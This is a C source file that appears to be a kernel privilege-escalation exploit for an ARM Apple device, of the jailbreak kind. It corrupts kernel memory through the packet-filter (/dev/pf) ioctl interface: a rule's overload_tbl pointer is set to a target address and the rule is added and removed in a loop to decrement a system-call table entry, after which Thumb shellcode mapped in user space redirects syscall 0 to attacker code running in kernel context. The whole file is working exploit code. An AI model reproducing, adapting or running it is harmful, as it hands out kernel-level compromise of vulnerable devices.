#define PF 1
#define PRIVATE 1
#include "pfvar.h"
#include <assert.h>
#include <config/config.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <unistd.h>

extern struct mach_header *kern_hdr;
extern size_t kern_size;
extern char *devicetree;
extern size_t devicetree_size;
extern int ok_go(void *p, void *uap, int32_t *retval);

static int pffd;

static void pwn(unsigned int addr) {
    struct pfioc_trans trans;
    struct pfioc_trans_e trans_e;
    struct pfioc_pooladdr pp;
    struct pfioc_rule pr;

    memset(&trans, 0, sizeof(trans));
    memset(&trans_e, 0, sizeof(trans_e));
    memset(&pr, 0, sizeof(pr));

    trans.size = 1;
    trans.esize = sizeof(trans_e);
    trans.array = &trans_e;
    trans_e.rs_num = PF_RULESET_FILTER;
    memset(trans_e.anchor, 0, MAXPATHLEN);
    assert(!ioctl(pffd, DIOCXBEGIN, &trans)); 
    u_int32_t ticket = trans_e.ticket;

    assert(!ioctl(pffd, DIOCBEGINADDRS, &pp));
    u_int32_t pool_ticket = pp.ticket;

    pr.action = PF_PASS;
    pr.nr = 0;
    pr.ticket = ticket;
    pr.pool_ticket = pool_ticket;
    memset(pr.anchor, 0, MAXPATHLEN);
    memset(pr.anchor_call, 0, MAXPATHLEN);

    pr.rule.return_icmp = 0;
    pr.rule.action = PF_PASS;
    pr.rule.af = AF_INET;
    pr.rule.proto = IPPROTO_TCP;
    pr.rule.rt = 0;
    pr.rule.rpool.proxy_port[0] = htons(1);
    pr.rule.rpool.proxy_port[1] = htons(1);

    pr.rule.src.addr.type = PF_ADDR_ADDRMASK;
    pr.rule.dst.addr.type = PF_ADDR_ADDRMASK;
    
    pr.rule.overload_tbl = (void *)(addr - 0x4a4);
    
    errno = 0;

    assert(!ioctl(pffd, DIOCADDRULE, &pr));

    assert(!ioctl(pffd, DIOCXCOMMIT, &trans));

    pr.action = PF_CHANGE_REMOVE;
    assert(!ioctl(pffd, DIOCCHANGERULE, &pr));
}


void do_pwn() {
    unsigned int target_addr = CONFIG_TARGET_ADDR;
    unsigned int target_addr_real = target_addr & ~1;
    unsigned int target_pagebase = target_addr & ~0xfff;
    unsigned int num_decs = (CONFIG_SYSENT_PATCH_ORIG - target_addr) >> 24;
    assert(MAP_FAILED != mmap((void *) target_pagebase, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
    unsigned short *p = (void *) target_addr_real;
    if(target_addr_real & 2) *p++ = 0x46c0; // nop
    *p++ = 0x4b00; // ldr r3, [pc]
    *p++ = 0x4718; // bx r3
    *((unsigned int *) p) = (unsigned int) &ok_go;
    assert(!mprotect((void *)target_pagebase, 0x2000, PROT_READ | PROT_EXEC));
    
    pffd = open("/dev/pf", O_RDWR);
    ioctl(pffd, DIOCSTOP);
    assert(!ioctl(pffd, DIOCSTART));
    unsigned int sysent_patch = CONFIG_SYSENT_PATCH;
    while(num_decs--)
        pwn(sysent_patch+3);
    assert(!ioctl(pffd, DIOCSTOP));
    close(pffd);
    
    assert(!mlock((void *) target_pagebase, 0x2000));

    // ew, ew...
    static const uint32_t txtsize = DEBUG ? 0x2000 : 0x1000;
    static const uint32_t dtasize = 0x1000;
    static const uint32_t totalsize = txtsize + dtasize;

    // I don't even want to know...
    char buf[totalsize];
    memcpy(buf, (void *) 0x08000000, totalsize);
    assert(!munmap((void *) 0x08000000, totalsize));
    assert(MAP_FAILED != mmap((void *) 0x08000000, totalsize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
    memcpy((void *) 0x08000000, buf, totalsize);
    assert(!mprotect((void *) (0x08000000+dtasize), txtsize, PROT_READ | PROT_EXEC));

    assert(!mlock((void *) 0x08000000, totalsize));
#if DEBUG
    printf("ok\n"); fflush(stdout);
#endif
    syscall(0);
#if DEBUG
    printf("we're out\n"); fflush(stdout);
#endif
}

static void load(const char *fn, void **base, size_t *size) {
    int fd = open(fn, O_RDONLY);
    assert(fd != -1);
    off_t len = lseek(fd, 0, SEEK_END);
    void *addr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    assert(addr != MAP_FAILED);
    assert(!mlock(addr, (size_t) len));
    *base = addr;
    *size = (size_t) len;
}

int main() {
    load("kern", (void **) &kern_hdr, &kern_size);
    load("devicetree", (void **) &devicetree, &devicetree_size);
    
    do_pwn();
    return 0;
}
